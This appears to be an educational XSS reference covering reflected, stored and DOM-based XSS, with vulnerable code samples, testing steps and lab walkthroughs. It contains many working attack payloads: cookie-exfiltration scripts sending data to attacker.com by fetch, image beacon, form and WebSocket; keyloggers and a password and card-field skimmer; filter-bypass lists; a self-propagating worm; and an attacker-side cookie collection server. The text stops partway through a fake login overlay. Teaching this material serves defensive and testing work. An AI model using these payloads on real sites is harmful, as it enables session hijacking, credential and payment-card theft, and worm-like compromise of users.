# Cross-Site Scripting (XSS)

Cross-site scripting (XSS) is a client-side code injection vulnerability that enables attackers to inject malicious JavaScript into web pages viewed by other users, executing arbitrary scripts within victims' browsers in the context of the vulnerable application. XSS circumvents the same-origin policy—a fundamental browser security mechanism designed to isolate different websites from each other—by causing a trusted website to deliver attacker-controlled code. When the malicious script executes in a victim's browser with the application's origin, the attacker can impersonate the victim, steal session cookies and authentication tokens, capture keystrokes and form data, perform unauthorized actions, access sensitive information, deface pages, redirect users to malicious sites, and in cases where victims have administrative privileges, completely compromise the application and all its users' data.

The fundamental vulnerability: **applications include untrusted data in web pages without proper validation, filtering, or encoding**—user input becomes executable code when browsers parse responses containing unescaped malicious content.

## What is Cross-Site Scripting (XSS)?

### Understanding XSS mechanics

**Attack lifecycle:**

```
Step 1: Attacker identifies injection point
    ↓
Step 2: Attacker crafts malicious JavaScript payload
    ↓
Step 3: Payload delivered to application (URL, form, etc.)
    ↓
Step 4: Application includes payload in response without encoding
    ↓
Step 5: Victim's browser receives response with malicious script
    ↓
Step 6: Browser executes script (trusts it as part of application)
    ↓
Step 7: Script runs with application's origin and victim's privileges
    ↓
Step 8: Attacker achieves objectives (steal data, perform actions)
```

**Simple vulnerable example:**

**Search functionality:**
```php
<?php
// Vulnerable PHP code
$search = $_GET['q'];
echo "<h1>Results for: " . $search . "</h1>";
?>
```

**Normal use:**
```
URL: /search?q=laptops
Output: <h1>Results for: laptops</h1>
Browser displays: Results for: laptops
```

**Malicious use:**
```
URL: /search?q=<script>alert(document.domain)</script>
Output: <h1>Results for: <script>alert(document.domain)</script></h1>
Browser executes: alert(document.domain)
Alert dialog shows: vulnerable-site.com
```

**Real attack payload:**
```javascript
<script>
// Exfiltrate session cookie to attacker's server
fetch('https://attacker.com/collect?cookie=' + document.cookie);
</script>
```

### Same-Origin Policy bypass

**Same-Origin Policy (SOP) fundamentals:**

```
Browser security mechanism that isolates web content

Origin = Protocol + Domain + Port

Examples:
https://bank.com:443      (Origin A)
https://evil.com:443      (Origin B)
https://bank.com:8080     (Origin C - different port)
http://bank.com:443       (Origin D - different protocol)
https://sub.bank.com:443  (Origin E - different subdomain)

SOP restrictions:
✗ Evil.com cannot read bank.com's cookies
✗ Evil.com cannot access bank.com's DOM elements
✗ Evil.com cannot read bank.com's localStorage
✗ Evil.com scripts cannot make authenticated requests to bank.com
```

**How XSS defeats SOP:**

```
Without XSS (SOP protects users):
Attacker's site (evil.com) → Cannot access victim's bank.com session
Browser blocks cross-origin access

With XSS (SOP bypassed):
Attacker injects script into bank.com
Malicious script executes with bank.com origin
Script has full access to:
  ✓ bank.com cookies (including HttpOnly if DOM access)
  ✓ bank.com DOM and all page content
  ✓ bank.com localStorage and sessionStorage
  ✓ Can make authenticated AJAX requests to bank.com
  ✓ Can read CSRF tokens and bypass protections
  ✓ Can access anything the victim can access

Why it works:
Browser trusts the script because it came from bank.com
SOP allows same-origin scripts full access
Attacker's code runs with victim's privileges
```

### XSS proof of concept payloads

**Traditional PoC (alert):**
```html
<script>alert('XSS')</script>
<script>alert(document.domain)</script>
<script>alert(1)</script>
```

**Note:** Chrome 92+ (July 2021) blocks `alert()` in cross-origin iframes. PortSwigger research recommends alternatives for modern testing.

**Modern PoC alternatives:**

```html
<!-- Print function (recommended by PortSwigger) -->
<script>print()</script>

<!-- Console logging -->
<script>console.log('XSS_Confirmed')</script>

<!-- DOM manipulation -->
<script>document.body.innerHTML='XSS_POC'</script>

<!-- Document write -->
<script>document.write('XSS_CONFIRMED')</script>

<!-- Image error handler -->
<img src=x onerror=alert('XSS')>

<!-- External script (verifiable via server logs) -->
<script src=//attacker.com/xss.js></script>

<!-- Event handler -->
<svg onload=alert(1)>
<body onload=alert(1)>

<!-- Data exfiltration test -->
<script>fetch('//attacker.com/test?poc='+document.domain)</script>
```

**PoC verification methods:**

```
1. Visual confirmation:
   - Alert/print dialog appears
   - Page content changes
   - Console shows output

2. Network confirmation:
   - Check browser DevTools Network tab
   - Verify request to attacker's server
   - Confirm external resource loaded

3. Behavioral confirmation:
   - Page behavior changes
   - JavaScript executes expected action
   - State modification occurs
```

## Types of XSS Attacks

### XSS classification overview

| Type | Payload Source | Stored | Requires Victim Action | Server Involvement | Detection Difficulty |
|------|----------------|--------|------------------------|-------------------|----------------------|
| **Reflected** | HTTP Request | No | Yes (click link) | Server reflects input | Low |
| **Stored** | Database | Yes | No (just visit page) | Server serves stored data | Low-Medium |
| **DOM-based** | Client-side processing | No | Varies | No server reflection | High |

### Attack vector comparison

**Reflected XSS:**
```
Data flow: URL parameter → Server → Response → Victim browser
Example: /search?q=<script>alert(1)</script>
Victim must: Click malicious link
Persistence: No
Impact scope: Individual victims who click link
```

**Stored XSS:**
```
Data flow: Attacker input → Database → Server → All visitors
Example: Blog comment with <script>alert(1)</script>
Victim must: Visit page containing payload
Persistence: Yes (stored in database)
Impact scope: All users viewing affected content
```

**DOM-based XSS:**
```
Data flow: URL/data → Client-side JavaScript → DOM
Example: document.write(location.hash)
Victim must: Visit crafted URL (similar to reflected)
Persistence: No
Impact scope: Individual victims, harder to detect
```

## Reflected XSS

### Understanding reflected XSS

**Definition:** Malicious script originates from the current HTTP request and is immediately "reflected" back in the server's response without proper encoding.

**Key characteristics:**
- Non-persistent (not stored on server)
- Requires social engineering (victim must click link)
- Executes once per visit
- Most common XSS type
- Easier to find but harder to exploit at scale

### Attack methodology

**Step-by-step attack flow:**

**Step 1: Identify reflection point**

```http
GET /search?query=test123 HTTP/1.1
Host: vulnerable-site.com

Response:
<div class="results">
    <h2>Search results for: test123</h2>
    <p>No results found for "test123"</p>
</div>
```

User input `test123` reflected in two places without encoding.

**Step 2: Test for special character filtering**

```http
GET /search?query=<>"'&/ HTTP/1.1

Response:
<h2>Search results for: <>"'&/</h2>
```

If special characters appear unencoded, likely vulnerable.

**Step 3: Inject basic script tag**

```http
GET /search?query=<script>alert(1)</script> HTTP/1.1

Response:
<h2>Search results for: <script>alert(1)</script></h2>
```

If alert executes, vulnerability confirmed.

**Step 4: Craft exploitation payload**

```javascript
// Session hijacking payload
<script>
fetch('https://attacker.com/steal?session=' + document.cookie);
</script>

// URL-encoded for real attack
%3Cscript%3Efetch%28%27https%3A%2F%2Fattacker.com%2Fsteal%3Fsession%3D%27%2Bdocument.cookie%29%3B%3C%2Fscript%3E
```

**Step 5: Deliver to victim**

```
Crafted URL:
https://vulnerable-site.com/search?query=%3Cscript%3Efetch%28%27https%3A%2F%2Fattacker.com%2Fsteal%3Fsession%3D%27%2Bdocument.cookie%29%3B%3C%2Fscript%3E

Delivery methods:
- Phishing email: "Check out this product!"
- Social media message
- Malicious website with redirect
- Forum/comment with shortened URL
- QR code pointing to malicious URL
```

### Real-world reflected XSS scenarios

**Scenario 1: Error messages**

**Vulnerable code:**
```python
# Python Flask
@app.route('/item')
def item():
    item_id = request.args.get('id')
    if not item_exists(item_id):
        return f'<h1>Error</h1><p>Item {item_id} not found</p>'
```

**Exploit:**
```
URL: /item?id=<script>alert(document.cookie)</script>
Response: <p>Item <script>alert(document.cookie)</script> not found</p>
Script executes in error page
```

**Scenario 2: Tracking/analytics parameters**

**Vulnerable code:**
```javascript
// Node.js/Express
app.get('/page', (req, res) => {
    const referrer = req.query.ref;
    res.send(`
        <h1>Welcome!</h1>
        <p>Referred from: ${referrer}</p>
        <script>trackReferrer('${referrer}');</script>
    `);
});
```

**Exploit:**
```
URL: /page?ref=');fetch('//attacker.com/?c='+document.cookie);//

Rendered JavaScript:
<script>trackReferrer('');fetch('//attacker.com/?c='+document.cookie);//');</script>

Result: Tracking function closed, malicious fetch executes
```

**Scenario 3: Form validation feedback**

**Vulnerable code:**
```php
<?php
$email = $_POST['email'];
if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
    echo "<p>Invalid email: " . $email . "</p>";
}
?>
```

**Exploit:**
```http
POST /register HTTP/1.1
Content-Type: application/x-www-form-urlencoded

email=<img src=x onerror=alert(1)>

Response:
<p>Invalid email: <img src=x onerror=alert(1)></p>
```

### Common injection points for reflected XSS

**URL parameters:**
```
/search?q=PAYLOAD
/product?id=PAYLOAD
/error?message=PAYLOAD
/redirect?url=PAYLOAD
/login?next=PAYLOAD
/profile?username=PAYLOAD
```

**HTTP headers (reflected in response):**
```http
User-Agent: PAYLOAD
Referer: https://site.com/PAYLOAD
X-Forwarded-For: PAYLOAD
Accept-Language: PAYLOAD
Cookie: tracking=PAYLOAD
```

**POST data:**
```http
POST /comment HTTP/1.1

name=PAYLOAD&comment=test&submit=Post
```

**File paths:**
```
/uploads/../../PAYLOAD
/static/PAYLOAD.css
```

### Testing methodology

**Manual testing process:**

**Step 1: Map reflection points**

```
Test string: xsstest_12345_unique

Submit to every input:
- Search boxes
- Login/registration forms
- Comment fields
- Profile updates
- Contact forms
- Feedback forms
- Newsletter signups

Search response for: xsstest_12345_unique
Note: Location, context, encoding
```

**Step 2: Test context-specific payloads**

**HTML context (between tags):**
```html
Input location: <div>USER_INPUT</div>

Test: <script>alert(1)</script>
Also try: <img src=x onerror=alert(1)>
         <svg onload=alert(1)>
```

**Attribute context (inside tag attribute):**
```html
Input location: <input value="USER_INPUT">

Test: "><script>alert(1)</script>
Also try: " autofocus onfocus=alert(1) x="
         " onmouseover="alert(1)
```

**JavaScript context (inside script tag):**
```html
Input location: <script>var q="USER_INPUT";</script>

Test: ";alert(1);//
Also try: ';alert(1);//
         </script><script>alert(1)</script><script>
```

**URL context (href/src attributes):**
```html
Input location: <a href="USER_INPUT">

Test: javascript:alert(1)
Also try: data:text/html,<script>alert(1)</script>
```

**Step 3: Bypass filters**

**Common filters and bypasses:**

```javascript
// Filter blocks: <script>
Bypass: <scr<script>ipt>alert(1)</scr</script>ipt>
        <ScRiPt>alert(1)</ScRiPt>
        <img src=x onerror=alert(1)>
        <svg/onload=alert(1)>

// Filter blocks: alert
Bypass: (alert)(1)
        window['al'+'ert'](1)
        eval('al'+'ert(1)')
        top['alert'](1)

// Filter blocks: ()
Bypass: <script>alert`1`</script>
        <svg onload=alert`1`>
        throw onerror=alert,'1'

// Filter blocks: quotes
Bypass: String.fromCharCode(88,83,83)
        /XSS/.source
        \u0061lert(1)  // Unicode escape
```

### Lab walkthrough: Reflected XSS in search functionality

**Scenario: Basic search with no filtering**

**Step 1: Test for reflection**
```http
GET /search?term=teststring12345 HTTP/1.1
Host: lab.web-security-academy.net

Response:
<h1>You searched for: teststring12345</h1>
```

**Step 2: Identify context**
```html
<!-- Source view shows: -->
<h1>You searched for: teststring12345</h1>
          ↑
    HTML element context, between tags
```

**Step 3: Test script injection**
```http
GET /search?term=<script>alert(1)</script>

Response renders:
<h1>You searched for: <script>alert(1)</script></h1>

Alert pops up → Confirmed vulnerable
```

**Step 4: Deliver exploit**
```
Final payload for victim:
https://lab.web-security-academy.net/search?term=<script>alert(1)</script>

When victim clicks, alert executes in their browser
Lab solved!
```

## Stored XSS

### Understanding stored XSS

**Definition:** Malicious payload permanently stored on target server (database, file system, cache, logs) and automatically served to users viewing the affected page.

**Key characteristics:**
- Persistent (survives server restarts)
- No direct victim interaction needed beyond visiting page
- Affects multiple users automatically
- Higher severity than reflected XSS
- Potential for worm-like propagation

**Also known as:**
- Persistent XSS
- Second-order XSS (when stored in one location, displayed in another)
- Type-II XSS

### Attack flow

**Stored XSS lifecycle:**

**Phase 1: Injection**
```http
POST /blog/comment HTTP/1.1
Host: vulnerable-blog.com
Content-Type: application/x-www-form-urlencoded

comment=Great article! <script>fetch('//attacker.com/steal?c='+document.cookie)</script>&name=Attacker&email=bad@evil.com
```

**Phase 2: Storage**
```sql
-- Server stores in database
INSERT INTO comments (post_id, author, comment, date)
VALUES (
    123,
    'Attacker',
    'Great article! <script>fetch(''//attacker.com/steal?c=''+document.cookie)</script>',
    NOW()
);
```

**Phase 3: Retrieval and display**
```php
<?php
// Later, when any user views the blog post
$comments = $db->query("SELECT * FROM comments WHERE post_id = 123");

foreach ($comments as $comment) {
    // Vulnerable: no encoding
    echo "<div class='comment'>";
    echo "<strong>" . $comment['author'] . "</strong><br>";
    echo $comment['comment'];
    echo "</div>";
}
?>
```

**Phase 4: Automatic execution**
```html
<!-- Every visitor sees: -->
<div class='comment'>
    <strong>Attacker</strong><br>
    Great article! <script>fetch('//attacker.com/steal?c='+document.cookie)</script>
</div>

<!-- Script executes automatically for every visitor -->
```

### Common stored XSS locations

**User-generated content areas:**

```
High-value targets:
✓ Blog/article comments
✓ Forum posts and replies
✓ Product reviews
✓ User profile fields (bio, location, website)
✓ Chat/messaging systems
✓ Support ticket systems
✓ Guestbook entries
✓ Wiki pages
✓ Collaborative documents
```

**Less obvious but equally dangerous:**

```
Stored in database, displayed in:
✓ Admin panels (logs, user management)
✓ Email notifications (webmail display)
✓ Report generation
✓ Search suggestions (if stored)
✓ File names (uploaded files)
✓ Image metadata (EXIF data)
✓ Configuration settings
✓ Shopping cart items
✓ Order history
✓ Notification messages
```

### Real-world stored XSS scenarios

**Scenario 1: Social media profile**

**Vulnerable application:**
```javascript
// Profile update endpoint
app.post('/profile/update', authenticate, async (req, res) => {
    const { bio, website, location } = req.body;
    
    // Stores without validation
    await db.query(
        'UPDATE users SET bio=?, website=?, location=? WHERE id=?',
        [bio, website, location, req.user.id]
    );
});

// Profile display
app.get('/profile/:id', async (req, res) => {
    const user = await db.query('SELECT * FROM users WHERE id=?', [req.params.id]);
    
    // Renders without encoding
    res.send(`
        <div class="profile">
            <h2>${user.username}</h2>
            <p>${user.bio}</p>
            <p>Website: <a href="${user.website}">${user.website}</a></p>
            <p>Location: ${user.location}</p>
        </div>
    `);
});
```

**Attack:**
```
Update profile bio:
JavaScript enthusiast <img src=x onerror="fetch('//attacker.com/collect?data='+btoa(document.body.innerHTML))">

Result:
- Payload stored in database
- Anyone viewing profile executes script
- Attacker collects page data from all viewers
```

**Scenario 2: E-commerce product reviews**

**Vulnerable code:**
```python
# Flask app
@app.route('/product/<id>/review', methods=['POST'])
def submit_review(id):
    rating = request.form['rating']
    review_text = request.form['review']
    
    # Store review
    db.execute(
        'INSERT INTO reviews (product_id, rating, review) VALUES (?, ?, ?)',
        (id, rating, review_text)
    )
    
@app.route('/product/<id>')
def show_product(id):
    reviews = db.execute('SELECT * FROM reviews WHERE product_id = ?', (id,))
    
    html = '<div class="reviews">'
    for review in reviews:
        # Vulnerable: no escaping
        html += f'<div class="review">'
        html += f'<p>Rating: {review.rating}/5</p>'
        html += f'<p>{review.review}</p>'
        html += f'</div>'
    html += '</div>'
    
    return html
```

**Attack:**
```html
Submit review:
This product is amazing! 5 stars!
<script>
// Keylogger
document.addEventListener('keypress', e => {
    fetch('//attacker.com/keys?k=' + e.key);
});
</script>

Impact:
- All customers viewing product have keylogger installed
- Credit card numbers entered on checkout page logged
- Credentials for account login captured
```

**Scenario 3: Internal admin panel**

**Vulnerable logging system:**
```javascript
// User activity logged
app.use((req, res, next) => {
    const log = {
        timestamp: new Date(),
        ip: req.ip,
        userAgent: req.headers['user-agent'],
        url: req.url,
        user: req.user?.username || 'anonymous'
    };
    
    db.logs.insert(log);
    next();
});

// Admin views logs
app.get('/admin/logs', requireAdmin, async (req, res) => {
    const logs = await db.logs.find().limit(100);
    
    let html = '<table><tr><th>Time</th><th>User</th><th>URL</th><th>User Agent</th></tr>';
    logs.forEach(log => {
        // No encoding!
        html += `<tr>
            <td>${log.timestamp}</td>
            <td>${log.user}</td>
            <td>${log.url}</td>
            <td>${log.userAgent}</td>
        </tr>`;
    });
    html += '</table>';
    
    res.send(html);
});
```

**Attack:**
```http
GET / HTTP/1.1
User-Agent: <script>fetch('//attacker.com/admin?token='+localStorage.adminToken)</script>

Flow:
1. Attacker sends request with malicious User-Agent
2. Logged in database
3. Admin views logs page
4. Script executes in admin's browser
5. Admin's authentication token stolen
6. Attacker gains admin access
```

### Testing methodology for stored XSS

**Comprehensive testing approach:**

**Step 1: Identify storage and display pairs**

```
Map application data flow:

Input → Storage → Output

Examples:
Comment form → Database → Comment section
Profile update → Database → Profile page
Chat message → Database → Chat window
File upload → Filesystem → Download/view page
Support ticket → Database → Admin panel
```

**Step 2: Submit unique identifiable payloads**

```
For each input point, submit:
xss_LOCATION_12345<script>alert('LOCATION')</script>

Examples:
Comment: xss_comment_12345<script>alert('comment')</script>
Username: xss_username_12345<script>alert('username')</script>
Bio: xss_bio_12345<img src=x onerror=alert('bio')>

Unique identifier helps track where payload appears
```

**Step 3: Navigate application to find display locations**

```
Check everywhere data might appear:
✓ Original submission page
✓ User profile pages
✓ Homepage/dashboard
✓ Search results
✓ Admin panels
✓ Email notifications (if you have access)
✓ PDF reports/exports
✓ Mobile app (if exists)
✓ API responses

Use browser search: Ctrl+F for "xss_comment_12345"
```

**Step 4: Verify persistence and scope**

```
Test persistence:
1. Logout
2. Login as different user
3. Navigate to display location
4. Check if payload still there and executes

Test scope:
- Does it affect all users?
- Only users with specific roles?
- Only on specific pages?
- Surviving server restart?
```

**Step 5: Test in different contexts**

```
Same payload may appear in multiple contexts:

HTML context:
<div>xss_test<script>alert(1)</script></div>

Attribute context:
<img alt="xss_test<script>alert(1)</script>">

JavaScript context:
<script>var name = "xss_test<script>alert(1)</script>";</script>

Each may require different payload for exploitation
```

### Lab walkthrough: Stored XSS in blog comments

**Scenario: Comment system without encoding**

**Step 1: Identify functionality**
```
Blog post with comment form:
- Name field
- Email field
- Comment field
- Submit button
```

**Step 2: Submit test comment**
```http
POST /post/comment HTTP/1.1

name=TestUser&email=test@test.com&comment=Test+comment+12345

Comment appears on page:
<div class="comment">
    <strong>TestUser</strong>
    <p>Test comment 12345</p>
</div>
```

**Step 3: Test for XSS**
```http
POST /post/comment HTTP/1.1

name=Attacker&email=bad@test.com&comment=<script>alert(1)</script>

Page now shows:
<div class="comment">
    <strong>Attacker</strong>
    <p><script>alert(1)</script></p>
</div>

Alert executes → Stored XSS confirmed
```

**Step 4: Verify persistence**
```
1. Refresh page → Alert still fires
2. Open in incognito window → Alert still fires
3. Check from different account → Alert still fires

Confirmed: Persistent stored XSS affecting all visitors
```

**Step 5: Deploy exploit**
```html
POST /post/comment HTTP/1.1

comment=<script>fetch('//exploit-server.com/steal?c='+document.cookie)</script>

Every visitor's cookie now sent to attacker
Lab solved!
```

### Stored XSS worm propagation

**Self-propagating XSS (Samy worm style):**

```javascript
// Historical example concept (Myspace Samy worm, 2005)
<script>
// 1. Read current user's ID
const myId = document.querySelector('[data-user-id]').dataset.userId;

// 2. Add attacker as friend
fetch('/addFriend', {
    method: 'POST',
    body: 'friendId=attackerId'
});

// 3. Read this profile's HTML (including the worm code)
const wormCode = document.querySelector('.profile').innerHTML;

// 4. Update victim's profile with worm code
fetch('/profile/update', {
    method: 'POST',
    body: 'bio=' + encodeURIComponent(wormCode)
});

// 5. Now victim's profile infects others who visit it
</script>

Propagation:
Attacker profile (contains worm)
    ↓
User A visits → Infected → Profile updated with worm
    ↓
User B visits User A → Infected → Profile updated
    ↓
User C visits User B → Infected → Profile updated
    ↓
Exponential spread across platform
```

## DOM-based XSS

### Understanding DOM-based XSS

**Definition:** Vulnerability exists entirely in client-side JavaScript code that processes data from an attacker-controllable source and writes it to a dangerous sink within the Document Object Model.

**Critical distinction from server-side XSS:**

```
Server-side XSS (Reflected/Stored):
Client request → Server processes → Server includes payload in HTML → Browser receives malicious HTML → Executes
Vulnerability: Server-side code

DOM-based XSS:
Client request → Server returns safe HTML → Browser's JavaScript processes URL/data → JavaScript writes to DOM → Executes
Vulnerability: Client-side code
```

**Key characteristics:**
- No server-side reflection required
- Entire vulnerability in JavaScript
- Not visible in HTTP response
- Requires JavaScript code analysis
- Often harder to detect with traditional scanners

### Sources and sinks

**Sources (attacker-controllable input):**

**URL-based sources (most common):**
```javascript
location
location.href           // Full URL
location.search         // Query string: ?param=value
location.hash           // Fragment: #value
location.pathname       // Path: /page/path

document.URL           // Current page URL
document.documentURI   // Document URI
document.baseURI       // Base URI

document.referrer      // Referring page
```

**Other sources:**
```javascript
document.cookie
localStorage.getItem('key')
sessionStorage.getItem('key')
window.name
postMessage event data
Web Worker messages
```

**Sinks (dangerous output locations):**

**DOM manipulation sinks:**
```javascript
element.innerHTML
element.outerHTML
document.write()
document.writeln()
element.insertAdjacentHTML()
```

**Script execution sinks:**
```javascript
eval(userInput)
setTimeout(userInput)       // When passing string
setInterval(userInput)      // When passing string
Function(userInput)         // Constructor
new Function(userInput)
```

**Navigation sinks:**
```javascript
location = userInput
location.href = userInput
location.assign(userInput)
location.replace(userInput)
window.open(userInput)
```

**Script/resource loading sinks:**
```javascript
script.src = userInput
script.text = userInput
script.textContent = userInput
script.innerText = userInput
```

**jQuery sinks:**
```javascript
$(userInput)               // jQuery selector
$('#element').html(userInput)
$('#element').append(userInput)
```

### Common DOM XSS patterns

**Pattern 1: innerHTML with location.search**

**Vulnerable code:**
```html
<script>
// Get search parameter from URL
const urlParams = new URLSearchParams(window.location.search);
const searchTerm = urlParams.get('search');

// Dangerously write to page
document.getElementById('results').innerHTML = 'You searched for: ' + searchTerm;
</script>
```

**Exploit:**
```
URL: https://site.com/search?search=<img src=x onerror=alert(1)>

JavaScript processes:
searchTerm = "<img src=x onerror=alert(1)>"
innerHTML = "You searched for: <img src=x onerror=alert(1)>"

Browser parses innerHTML:
- Sees <img> tag
- src=x fails to load
- onerror event fires
- alert(1) executes
```

**Pattern 2: document.write() with location.hash**

**Vulnerable code:**
```html
<script>
// Read URL fragment
const section = location.hash.substring(1); // Remove #

// Write to document
document.write('<h1>Section: ' + section + '</h1>');
</script>
```

**Exploit:**
```
URL: https://site.com/page#<script>alert(document.cookie)</script>

Flow:
location.hash = "#<script>alert(document.cookie)</script>"
section = "<script>alert(document.cookie)</script>"
document.write('<h1>Section: <script>alert(document.cookie)</script></h1>')

Script tag written to document and executes
```

**Pattern 3: eval() with URL data**

**Vulnerable code:**
```html
<script>
const params = new URL(window.location).searchParams;
const userLang = params.get('lang') || 'en';

// Extremely dangerous
eval('setLanguage("' + userLang + '")');
</script>
```

**Exploit:**
```
URL: https://site.com/?lang=en");alert(document.domain);//

Evaluated code becomes:
setLanguage("en");alert(document.domain);//")

Executes:
setLanguage("en");
alert(document.domain);
// (comment)
```

**Pattern 4: jQuery selector with user input**

**Vulnerable code:**
```html
<script src="//code.jquery.com/jquery-3.6.0.min.js"></script>
<script>
const page = location.hash.substring(1);

// Dangerous: jQuery interprets HTML in selectors
$(page);
</script>
```

**Exploit:**
```
URL: https://site.com/#<img src=x onerror=alert(1)>

jQuery processes:
$("<img src=x onerror=alert(1)>")

jQuery creates element, onerror fires, script executes
```

**Pattern 5: Location assignment**

**Vulnerable code:**
```html
<script>
const params = new URLSearchParams(location.search);
const redirect = params.get('next');

if (redirect) {
    location = redirect;
}
</script>
```

**Exploit:**
```
URL: https://site.com/?next=javascript:alert(document.domain)

Executes:
location = "javascript:alert(document.domain)"

Browser navigates to javascript: URL, executes code
```

### Testing for DOM-based XSS

**Manual testing methodology:**

**Step 1: Identify client-side processing of URL data**

```javascript
// Search JavaScript files for:

// URL access
location
document.URL
window.location
URLSearchParams

// Dangerous sinks
innerHTML
outerHTML
document.write
eval
setTimeout
Function
```

**Browser DevTools technique:**
```
1. Open DevTools (F12)
2. Sources tab
3. Search all files (Ctrl+Shift+F)
4. Search for: "location" or "innerHTML"
5. Review each occurrence
6. Identify data flow: source → processing → sink
```

**Step 2: Test with unique identifier**

```
URL variations to test:
https://site.com/?param=domxss_test_12345
https://site.com/#domxss_test_12345
https://site.com/path/domxss_test_12345

After page loads:
1. Open DevTools Elements tab
2. Ctrl+F search for: domxss_test_12345
3. Note where it appears in DOM
4. Identify parent elements and attributes
```

**Step 3: Determine context and craft payload**

**HTML element context:**
```html
Found in: <div>domxss_test_12345</div>

Test: ?param=<img src=x onerror=alert(1)>
```

**Attribute context:**
```html
Found in: <a href="domxss_test_12345">

Test: #javascript:alert(1)
```

**JavaScript context:**
```html
Found in: <script>var x = "domxss_test_12345";</script>

Test: ?param=";alert(1);//
```

**Step 4: Use browser debugging**

```javascript
// Set breakpoint in suspicious code
debugger; // Add this line or use DevTools breakpoint

// Example: Break before innerHTML assignment
const userInput = location.hash.substring(1);
debugger; // Inspect userInput value here
element.innerHTML = userInput;

// Step through code execution:
1. Observe source data
2. Watch transformations
3. See final sink assignment
4. Confirm if payload reaches sink unmodified
```

### Lab walkthrough: DOM XSS in document.write sink

**Scenario: Tracking parameter written to document**

**Step 1: Analyze JavaScript code**

```html
<script>
function trackSearch(query) {
    document.write('<img src="/track?search=' + query + '">');
}

const urlParams = new URL(location).searchParams;
const search = urlParams.get('search');
if (search) {
    trackSearch(search);
}
</script>
```

**Analysis:**
```
Source: location (search parameter)
Processing: URLSearchParams.get()
Sink: document.write()
```

**Step 2: Test normal input**

```
URL: https://lab.com/?search=test

JavaScript executes:
document.write('<img src="/track?search=test">');

DOM result:
<img src="/track?search=test">
```

**Step 3: Inject HTML**

```
URL: https://lab.com/?search=test"><script>alert(1)</script>

JavaScript executes:
document.write('<img src="/track?search=test"><script>alert(1)</script>">');

DOM result:
<img src="/track?search=test">
<script>alert(1)</script>
">

Script tag created and executes!
```

**Step 4: URL encode for delivery**

```
Payload: "><script>alert(1)</script>
Encoded: %22%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E

Final URL:
https://lab.com/?search=%22%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E

Lab solved!
```

### Advanced DOM XSS detection

**Automated tools:**

```
Burp Suite DOM Invader:
- Browser extension
- Automatically tests DOM XSS
- Highlights sources and sinks
- Tests payloads automatically

Manual code review checklist:
☐ Map all sources (location, document.cookie, etc.)
☐ Track data flow through variables
☐ Identify transformations (decode, parse, sanitize attempts)
☐ Find all sinks (innerHTML, eval, etc.)
☐ Test if payload reaches sink unsanitized
```

### DOM XSS vs. Server-side XSS detection

**Why DOM XSS is harder to find:**

```
Server-side XSS:
✓ Visible in HTTP response
✓ Can inspect with proxy (Burp)
✓ Clear request → response flow
✓ Traditional scanners effective

DOM-based XSS:
✗ Not in HTTP response
✗ Executes after page load
✗ Complex JavaScript data flow
✗ Requires code analysis
✗ May bypass WAF/filters (client-side)
```

**Detection strategy:**

```
1. Static analysis:
   - Review all JavaScript files
   - Map sources to sinks
   - Identify dangerous patterns

2. Dynamic testing:
   - Inject unique tokens in URLs
   - Monitor DOM with DevTools
   - Test identified data flows

3. Automated scanning:
   - Burp Suite DOM Invader
   - OWASP ZAP DOM XSS plugin
   - Commercial DAST tools

4. Code instrumentation:
   - Add logging to JavaScript
   - Monitor data flow at runtime
   - Track untrusted data propagation
```

## XSS Exploitation Techniques

### Session hijacking (cookie theft)

**Most common XSS exploitation goal: stealing session cookies**

**Basic cookie exfiltration:**
```html
<script>
// Simple fetch to attacker's server
fetch('https://attacker.com/steal?cookie=' + document.cookie);
</script>
```

**More sophisticated approaches:**

**Method 1: Image beacon (works even with CSP img-src):**
```html
<script>
new Image().src = 'https://attacker.com/log?c=' + document.cookie;
</script>
```

**Method 2: Form submission:**
```html
<script>
const form = document.createElement('form');
form.method = 'POST';
form.action = 'https://attacker.com/steal';

const input = document.createElement('input');
input.name = 'cookie';
input.value = document.cookie;
form.appendChild(input);

document.body.appendChild(form);
form.submit();
</script>
```

**Method 3: WebSocket (bidirectional communication):**
```html
<script>
const ws = new WebSocket('wss://attacker.com/ws');
ws.onopen = () => {
    ws.send(JSON.stringify({
        cookie: document.cookie,
        localStorage: JSON.stringify(localStorage),
        url: location.href
    }));
};
</script>
```

**Attacker's collection server:**
```javascript
// Express.js server
const express = require('express');
const app = express();

app.get('/steal', (req, res) => {
    const cookie = req.query.cookie;
    const ip = req.ip;
    const userAgent = req.headers['user-agent'];
    
    console.log('Cookie stolen:', {
        cookie,
        ip,
        userAgent,
        timestamp: new Date()
    });
    
    // Log to file
    fs.appendFileSync('stolen_cookies.txt', 
        `${new Date().toISOString()} - ${ip} - ${cookie}\n`
    );
    
    // Return 1x1 transparent pixel
    res.set('Content-Type', 'image/gif');
    res.send(Buffer.from('R0lGODlhAQABAIAAAP///wAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==', 'base64'));
});

app.listen(80);
```

**Using stolen cookies:**
```javascript
// In attacker's browser console on victim site
document.cookie = "session=stolen_session_id_here";
// Now authenticated as victim
location.reload();
```

### Keylogging

**Capture all keystrokes on page:**

```html
<script>
let buffer = '';
let lastSend = Date.now();

document.addEventListener('keypress', function(e) {
    buffer += e.key;
    
    // Send every 5 seconds or every 20 characters
    if (buffer.length >= 20 || Date.now() - lastSend > 5000) {
        fetch('https://attacker.com/keys', {
            method: 'POST',
            body: JSON.stringify({
                keys: buffer,
                url: location.href,
                time: new Date().toISOString()
            })
        });
        buffer = '';
        lastSend = Date.now();
    }
});

// Capture on page unload
window.addEventListener('beforeunload', () => {
    if (buffer.length > 0) {
        // Use sendBeacon for reliable sending during unload
        navigator.sendBeacon('https://attacker.com/keys', buffer);
    }
});
</script>
```

**Form-specific keylogger:**
```html
<script>
// Target password/credit card fields specifically
document.querySelectorAll('input[type="password"], input[name*="card"]').forEach(input => {
    input.addEventListener('input', function() {
        fetch('https://attacker.com/sensitive', {
            method: 'POST',
            body: JSON.stringify({
                field: this.name,
                value: this.value,
                page: location.href
            })
        });
    });
});
</script>
```

### Credential theft via phishing

**Inject fake login form:**

```html
<script>
// Hide real content
document.body.style.display = 'none';

// Create fake login overlay
const overlay = document.createElement('div');
overlay.innerHTML = `
    <div style="
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background: rgba(0,0,0,0.8);
        display: flex;
        justify-content: center;
        align-items: center;
        z-index: 999999;
    ">
        <div style="
            background: white;
            padding: 40px;
            border-radius: 8px;
